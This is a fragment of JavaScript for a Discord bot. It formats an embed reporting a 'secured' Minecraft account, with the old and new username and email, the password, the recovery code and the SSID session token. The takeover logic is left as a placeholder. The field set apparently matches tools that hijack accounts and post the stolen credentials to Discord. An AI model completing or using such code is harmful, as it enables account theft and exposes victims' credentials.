...
async function generateSecuringEmbed(discordUser, minecraftUsername, accountDetails) {
  // Fetch the Minecraft head from an external API (using crafatar or similar)
  const minecraftHeadUrl = `https://crafatar.com/avatars/${minecraftUsername}?size=64`;

  // Create the embed
  const embed = new MessageEmbed()
      .setColor('#0099ff')
      .setTitle('Securing account...')
      .setDescription(`Securing account details for **${minecraftUsername}**`)
      .setThumbnail(minecraftHeadUrl) // Set Minecraft head image in the top left
      .addFields(
          { name: 'Old Username', value: accountDetails.oldName, inline: true },
          { name: 'New Username', value: accountDetails.newName, inline: true },
          { name: 'Old Email', value: accountDetails.oldEmail, inline: true },
          { name: 'New Email', value: accountDetails.email, inline: true },
          { name: 'Security Email', value: accountDetails.secEmail, inline: true },
          { name: 'Password', value: accountDetails.password, inline: true },
          { name: 'Recovery Code', value: accountDetails.recoveryCode, inline: true },
          { name: 'SSID', value: accountDetails.ssid, inline: true },
          { name: 'Time Taken', value: `${accountDetails.timeTaken} seconds`, inline: true },
      )
      .setFooter(
          `${discordUser.username}`, // Discord username
          `${discordUser.displayAvatarURL({ dynamic: true })}` // Discord profile picture
      )
      .setTimestamp();
...
module.exports = async (host, id, settings, discordUser, minecraftUsername) => {
  let start = Date.now();
  console.log(`Securing... [${id}]!`);
  ...
  // Your securing logic here...



  // Generate and return the embed with Minecraft head and Discord footer
  return await generateSecuringEmbed(discordUser, minecraftUsername, accountDetails);
};
